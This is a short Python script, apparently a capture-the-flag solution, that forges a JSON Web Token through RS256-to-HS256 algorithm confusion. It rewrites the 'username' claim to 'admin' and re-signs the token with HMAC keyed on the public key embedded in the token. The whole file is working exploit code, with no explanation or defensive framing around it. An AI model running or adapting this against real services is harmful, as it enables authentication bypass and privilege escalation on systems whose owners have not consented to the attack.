import sys
import jwt
import hmac

from base64 import urlsafe_b64encode
from hashlib import sha256

if len(sys.argv) < 2:
    print("Usage: python3 \"{}\" <jwt> <public key>".format(sys.argv[0]))
    exit(1)

def modify_token(token, secret):
    decoded = jwt.decode(token, key=secret, algorithms=['RS256', 'HS256'])
    decoded['username'] = 'admin'

    encoded = jwt.encode(decoded, key='test', algorithm='HS256')
    encoded = encoded[:encoded.rfind(b'.')]

    pk = decoded['pk'].encode()
    sig = urlsafe_b64encode(hmac.new(key=pk, msg=encoded, digestmod=sha256).digest())
    
    return encoded + b'.' + sig.replace(b'=', b'')

print(modify_token(sys.argv[1], sys.argv[2].replace('\\n', '\n').encode()))
